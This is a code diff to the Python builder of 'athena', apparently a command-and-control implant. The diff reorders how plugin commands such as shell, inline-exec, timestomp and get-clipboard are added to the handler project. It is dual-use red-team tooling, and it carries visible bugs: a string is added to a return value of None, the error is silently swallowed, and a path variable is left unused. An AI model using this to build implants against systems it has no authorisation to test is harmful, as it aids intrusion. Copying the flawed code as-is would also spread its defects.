@@ -125,9 +125,9 @@ def buildWebsocket(self, agent_build_path, c2):
 #     p = subprocess.Popen(["dotnet", "add", "package", "Microsoft.DotNet.ILCompiler","-v","7.0.0-*"], cwd=os.path.join(agent_build_path.name,"Athena"))
 #     p.wait()
 
-def addCommand(agent_build_path, command_name):
+def addCommand(agent_build_path, command_name, handlerPath):
     project_path = os.path.join(agent_build_path.name, "AthenaPlugins", command_name, "{}.csproj".format(command_name))
-    p = subprocess.Popen(["dotnet", "add", "Athena", "reference", project_path], cwd=agent_build_path.name)
+    p = subprocess.Popen(["dotnet", "add", "Athena", "reference", handlerPath], cwd=agent_build_path.name)
     p.wait()
     # stdout, stderr = p.communicate()
     # res = ""
@@ -298,19 +298,6 @@ class athena(PayloadType):
             loadable_commands = ["arp","cat","cd","cp","crop","drives","ds","env","farmer","get-clipboard","get-localgroup","get-sessions","get-shares","hostname","ifconfig","inline-exec",
             "kill","ls","mkdir","mv","nslookup","patch","ps","pwd","reg","rm","sftp","shell","ssh","tail","test-port","timestomp","uptime","wget","whoami","win-enum-resources"]
 
-            for cmd in self.commands.get_commands():
-                if cmd in loadable_commands:
-                    if cmd == "ds" and self.selected_os.upper() == "REDHAT":
-                        build_msg += "Ignoring ds because it's not supported on RHEL" + '\n'
-                        continue
-                    else:
-                        try:
-                            build_msg += "Adding command...{}".format(cmd) + '\n'
-                            directives += cmd.replace("-","").upper() + ";"
-                            addCommand(agent_build_path, cmd) + '\n'
-                            roots_replace += "<assembly fullname=\"{}\"/>".format(cmd) + '\n'
-                        except:
-                            pass
 
             build_msg += "Determining selected OS...{}".format(self.selected_os) + '\n'
             if self.selected_os.upper() == "WINDOWS":
@@ -334,18 +321,35 @@ class athena(PayloadType):
             
             handlerPath = ""
 
-
-
             if self.get_parameter("native-aot"):
                 handlerPath = "{}/Athena.Commands.Native/Athena.Handler.Native.csproj".format(agent_build_path.name)
                 directives += ";NATIVEAOT"
             else:
                 handlerPath = "{}/Athena.Commands/Athena.Handler.Dynamic.csproj".format(agent_build_path.name)
                 directives += ";DYNAMIC"
+
+            for cmd in self.commands.get_commands():
+                if cmd in loadable_commands:
+                    if cmd == "ds" and self.selected_os.upper() == "REDHAT":
+                        build_msg += "Ignoring ds because it's not supported on RHEL" + '\n'
+                        continue
+                    else:
+                        try:
+                            build_msg += "Adding command...{}".format(cmd) + '\n'
+                            directives += cmd.replace("-","").upper() + ";"
+                            addCommand(agent_build_path, cmd, handlerPath) + '\n'
+                            roots_replace += "<assembly fullname=\"{}\"/>".format(cmd) + '\n'
+                        except:
+                            pass
+
+
             build_msg += "Adding Handler at...{}".format(handlerPath) + '\n'
             addHandler(agent_build_path, handlerPath)
             build_msg += "Final Directives...{}".format(directives) + '\n'
             os.environ["AthenaConstants"] = directives
+
+
+
 
 
             # Replace the roots file with the new one
